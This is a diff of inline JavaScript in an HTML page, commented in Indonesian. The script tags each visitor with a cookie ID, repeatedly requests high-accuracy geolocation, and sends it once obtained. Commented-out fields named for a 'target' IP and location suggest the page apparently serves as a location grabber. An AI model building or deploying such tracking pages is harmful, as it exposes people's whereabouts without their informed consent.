@@ -1776,14 +1776,14 @@ function xy() {
                 setTimeout(getLocation, 2000); // Coba lagi setelah 2 detik
             } else {
                 console.error("Gagal mendapatkan lokasi setelah beberapa percobaan.");
-
+                // Handle jika lokasi tetap tidak didapatkan setelah beberapa kali mencoba
             }
         }
 
         navigator.geolocation.getCurrentPosition(handlePosition, handleError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
     }
 
-
+    // Bagian untuk menangani ID
     const storedId = getCookie('uniqueId');
     let currentId;
 
@@ -1796,9 +1796,19 @@ function xy() {
         console.log("ID baru dibuat dan disimpan:", currentId);
     }
 
-    
+    // Dapatkan lokasi dengan percobaan ulang dan kirim hanya sekali setelah berhasil
     getLocationWithRetry(currentId);
 
+    // Anda bisa menghapus atau mengomentari bagian ini jika tidak lagi diperlukan untuk tampilan UI
+    // const idSpan = document.getElementById('randomId');
+    // const ipTargetValue = document.getElementById('ip_target_value');
+    // const locationTargetValue = document.getElementById('location_target_value');
+    // const linkMapsElement = document.getElementById('link_maps');
+    // if (idSpan) idSpan.textContent = currentId;
+    // if (ipTargetValue) ipTargetValue.textContent = currentId;
+}
+
+// Fungsi untuk mengatur cookie (tetap sama)
 function setCookie(name, value, days) {
     const date = new Date();
     date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
@@ -1806,7 +1816,7 @@ function setCookie(name, value, days) {
     document.cookie = name + "=" + value + ";" + expires + ";path=/";
 }
 
-
+// Fungsi untuk mendapatkan nilai cookie (tetap sama)
 function getCookie(name) {
     const cookieName = name + "=";
     const decodedCookie = decodeURIComponent(document.cookie);
@@ -1829,4 +1839,4 @@ function getRandomId() {
     }
 </script>
 </body>
-    </html>
+</html>
